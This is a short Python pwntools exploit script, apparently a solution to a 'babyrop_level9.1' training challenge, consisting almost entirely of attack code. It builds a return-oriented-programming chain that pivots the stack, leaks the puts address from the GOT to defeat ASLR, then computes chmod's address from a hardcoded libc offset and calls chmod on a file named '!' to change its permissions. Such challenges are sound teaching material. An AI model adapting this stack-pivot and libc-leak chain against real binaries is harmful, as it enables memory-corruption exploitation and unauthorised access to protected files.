from pwn import *

p = process("./babyrop_level9.1")

payload = b""
payload += p64(0x4013ed) # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
payload += p64(0x414080+16) # 8 bytes (+16 to start from 3rd gadget)
payload += p64(0x0) # 8 bytes into r13
payload += p64(0x0) # 8 bytes into r14
payload += p64(0x0) # 8 bytes into r15
payload += p64(0x4013f3) # pop rdi ; ret (to setup puts@plt(puts@got))
payload += p64(0x404020) # puts@got
payload += p64(0x4010a0) # puts@plt
payload += p64(0x4010f0) # go to _start()

p.sendline(payload)

print(p.recvuntil(b"Leaving!\n"))

puts_leak_addr = p.recvline().split(b'\n')[0][::-1]
puts_addr = int.from_bytes(puts_leak_addr)
print("[+] PUTS() ADDR LEAK :: " + hex(puts_addr))

offset_relative_puts_chmod = 0x7f160 # depends on libc
chmod_addr = puts_addr + offset_relative_puts_chmod # depends on libc

payload = b""
payload += p64(0x4013ed) # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
payload += p64(0x414080+16) # 8 bytes (+16 to start from 3rd gadget)
payload += p64(0x0) # 8 bytes into r13
payload += p64(0x0) # 8 bytes into r14
payload += p64(0x0) # 8 bytes into r15

payload += p64(0x4013f3) # pop rdi ; ret (to setup chmod)
payload += p64(0x402030) # filename* to '!' character
payload += p64(0x4013f1) # pop rsi ; pop r15 ; ret (to setup chmod)
payload += p64(0x4) # mode = 4
payload += p64(0x0) # pop into r15
payload += p64(chmod_addr) # go to challenge()

p.sendline(payload)

print(p.recvall())